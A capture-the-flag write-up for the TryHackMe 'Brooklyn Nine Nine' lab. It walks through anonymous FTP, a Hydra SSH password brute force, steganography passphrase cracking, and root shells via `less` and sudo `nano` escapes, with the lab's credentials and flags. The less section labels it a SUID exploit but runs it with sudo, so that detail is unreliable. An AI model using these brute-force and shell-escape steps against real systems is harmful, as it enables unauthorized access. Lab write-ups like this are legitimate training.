# TryHackMe — Brooklyn Nine Nine

## 1. Executive Summary

**Brooklyn Nine Nine** is a beginner-level Linux penetration-testing challenge on TryHackMe. The objective was to compromise the target machine, obtain the user flag, and escalate privileges to root.

During the assessment, two intended attack paths were identified:

1. **Jake → SUID `less` → Root**
2. **Steganography → Holt → Sudo `nano` → Root**

The assessment involved network reconnaissance, anonymous FTP enumeration, weak-password discovery, SSH access, steganography, SUID enumeration, and sudo privilege escalation.

---

## 2. Target Information

| Information      | Value               |
| ---------------- | ------------------- |
| Target IP        | `10.49.186.156`     |
| Hostname         | `brookly_nine_nine` |
| Operating System | Ubuntu Linux        |
| Assessment Type  | TryHackMe CTF       |
| Difficulty       | Beginner            |

---

## 3. Objectives

The main objectives were:

* Identify exposed network services.
* Enumerate accessible services.
* Obtain an initial foothold.
* Retrieve the user flag.
* Identify privilege-escalation opportunities.
* Explore the steganography clue.
* Obtain root access.
* Retrieve the root flag.

---

# 4. Reconnaissance

## 4.1 Nmap Service Scan

The first step was to perform service and version enumeration:

```bash
nmap -sC -sV -oN nmap.txt 10.49.186.156
```

The scan identified three open TCP ports:

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 21   | FTP     | vsftpd 3.0.3  |
| 22   | SSH     | OpenSSH 7.6p1 |
| 80   | HTTP    | Apache 2.4.29 |

A significant finding was:

```text
Anonymous FTP login allowed
```

The FTP server also exposed:

```text
note_to_jake.txt
```

---

## 4.2 Full Port Scan

A complete TCP port scan was performed:

```bash
nmap -p- --min-rate 5000 -oN allports.txt 10.49.186.156
```

The scan confirmed that only the following ports were open:

```text
21/tcp
22/tcp
80/tcp
```

No additional TCP services were discovered.

---

# 5. FTP Enumeration

Because anonymous FTP access was enabled, the FTP service was investigated.

```bash
ftp 10.49.186.156
```

The username used was:

```text
anonymous
```

After logging in, the available file was identified:

```text
note_to_jake.txt
```

The file was downloaded using:

```ftp
get note_to_jake.txt
```

The contents were then viewed:

```bash
cat note_to_jake.txt
```

The note indicated that **Jake's password was weak**.

This provided a username and suggested that password enumeration could be useful.

---

# 6. Obtaining Initial Access

## 6.1 SSH Password Enumeration

The discovered username was:

```text
jake
```

Hydra was used with the `rockyou.txt` wordlist against SSH:

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.49.186.156 ssh
```

A valid password was discovered:

```text
Username: jake
Password: 987654321
```

---

## 6.2 SSH Login

The credentials were used to establish an SSH session:

```bash
ssh jake@10.49.186.156
```

After authentication, access was obtained as:

```text
jake
```

This established the initial foothold on the target.

---

# 7. User Flag

After obtaining access as Jake, the filesystem was searched for the user flag:

```bash
find / -type f -name "user.txt" 2>/dev/null
```

The flag was located at:

```text
/home/holt/user.txt
```

It was retrieved using:

```bash
cat /home/holt/user.txt
```

### User Flag

```text
ee11cbb19052e40b07aac0ca060c23ee
```

---

# 8. Privilege Escalation — Method 1

## 8.1 SUID Enumeration

The system was searched for SUID-enabled binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the results was:

```text
/bin/less
```

The SUID configuration of `less` presented a potential privilege-escalation opportunity because `less` provides functionality capable of executing commands.

---

## 8.2 Exploiting `less`

The following command was executed:

```bash
sudo less /etc/profile
```

Inside `less`, the shell escape functionality was used:

```text
:!/bin/sh
```

A shell was spawned with elevated privileges.

The privilege level was verified:

```bash
whoami
```

Output:

```text
root
```

This successfully resulted in a root shell.

---

## 8.3 Root Flag

The root flag was retrieved using:

```bash
cat /root/root.txt
```

The flag was:

```text
63a9f0ea7bb98050796b649e85481845
```

---

# 9. Web Enumeration and Steganography

A second attack path was investigated through the HTTP service.

The web page contained the image:

```text
brooklyn99.jpg
```

The HTML source also contained the comment:

```html
<!-- Have you ever heard of steganography? -->
```

This indicated that information might be hidden within the image using steganography.

---

# 10. Extracting Hidden Data

The image was processed using `steghide`:

```bash
steghide extract -sf brooklyn99.jpg
```

A passphrase was required.

To recover the passphrase, StegCracker was used with the `rockyou.txt` wordlist:

```bash
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

The passphrase was successfully recovered:

```text
admin
```

The embedded content was then extracted:

```bash
steghide extract -sf brooklyn99.jpg
```

The tool reported:

```text
wrote extracted data to "note.txt".
```

---

# 11. Holt's Credentials

The extracted file was examined:

```bash
cat note.txt
```

It contained Holt's password:

```text
Holts Password:
fluffydog12@ninenine
```

This provided credentials for the `holt` account.

---

# 12. Switching to Holt

The account was accessed using:

```bash
su holt
```

The password discovered through steganography was supplied.

The account was verified with:

```bash
whoami
```

The result was:

```text
holt
```

---

# 13. Privilege Escalation — Method 2

## 13.1 Sudo Enumeration

The sudo permissions available to Holt were checked:

```bash
sudo -l
```

The output showed:

```text
User holt may run the following commands on brookly_nine_nine:

(ALL) NOPASSWD: /bin/nano
```

This meant that Holt could execute `nano` as root without providing a sudo password.

---

## 13.2 Exploiting `nano`

Nano was launched with root privileges:

```bash
sudo nano
```

Nano's command-execution functionality was then used to spawn a shell.

The command used was:

```text
reset; sh 1>&0 2>&0
```

The resulting shell was checked:

```bash
whoami
```

The result was:

```text
root
```

This confirmed successful privilege escalation.

---

# 14. Root Flag

The root flag was retrieved:

```bash
cat /root/root.txt
```

The result was:

```text
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```

### Root Flag

```text
63a9f0ea7bb98050796b649e85481845
```

---

# 15. Attack Paths

## Path 1 — Jake to Root

```text
Nmap
    ↓
Anonymous FTP
    ↓
note_to_jake.txt
    ↓
Weak Jake password
    ↓
Hydra
    ↓
SSH as Jake
    ↓
SUID enumeration
    ↓
/bin/less
    ↓
Shell escape
    ↓
Root
```

## Path 2 — Steganography to Root

```text
HTTP
    ↓
brooklyn99.jpg
    ↓
Steganography clue
    ↓
Steghide
    ↓
StegCracker
    ↓
Password: admin
    ↓
note.txt
    ↓
Holt's password
    ↓
su holt
    ↓
sudo -l
    ↓
NOPASSWD: /bin/nano
    ↓
Nano shell execution
    ↓
Root
```

---

# 16. Flags

| Flag      | Value                              |
| --------- | ---------------------------------- |
| User Flag | `ee11cbb19052e40b07aac0ca060c23ee` |
| Root Flag | `63a9f0ea7bb98050796b649e85481845` |

---

# 17. Tools Used

The following tools and Linux utilities were used during the assessment:

* **Nmap** — network and service enumeration
* **FTP** — anonymous FTP enumeration
* **cURL** — web-server inspection
* **Hydra** — SSH password discovery
* **SSH** — remote access
* **find** — filesystem and SUID enumeration
* **Steghide** — steganographic data extraction
* **StegCracker** — recovery of the steghide passphrase
* **su** — switching users
* **sudo** — privilege enumeration and execution
* **less** — SUID privilege escalation
* **nano** — sudo privilege escalation

---

# 18. Key Lessons Learned

### 18.1 Always Investigate Anonymous FTP

If Nmap reports:

```text
Anonymous FTP login allowed
```

immediately enumerate the available files.

Sensitive information can be accidentally exposed through anonymous FTP.

### 18.2 Inspect Web Source

HTML comments can contain useful hints that are not visible on the rendered webpage.

The following comment was particularly important:

```html
<!-- Have you ever heard of steganography? -->
```

### 18.3 Check SUID Binaries

A useful Linux privilege-escalation command is:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Unusual SUID binaries should be investigated because they may allow commands to execute with elevated privileges.

### 18.4 Always Run `sudo -l`

After obtaining a Linux account, one of the most important enumeration commands is:

```bash
sudo -l
```

In this case, it revealed:

```text
(ALL) NOPASSWD: /bin/nano
```

which provided another route to root.

### 18.5 Investigate Explicit CTF Hints

When a challenge explicitly mentions a technique such as steganography, it is worth investigating the referenced files.

Here, the image contained additional credentials that led to the `holt` account.

---

# 19. Conclusion

The **Brooklyn Nine Nine** machine demonstrated several fundamental penetration-testing concepts.

The initial foothold was obtained by enumerating anonymous FTP access, discovering a clue about Jake's weak password, and recovering the SSH password through a wordlist attack.

The first privilege-escalation path involved abusing the SUID-enabled `less` binary to obtain a root shell.

A second path was discovered through the web application's steganography clue. The `brooklyn99.jpg` image contained hidden data protected by the passphrase `admin`. Extracting the data revealed Holt's password. Holt was then found to have passwordless sudo access to `nano`, which could be leveraged to obtain another root shell.

The machine was successfully compromised through **both intended routes**, and both the user and root flags were obtained.

**Final status: ROOTED ✓**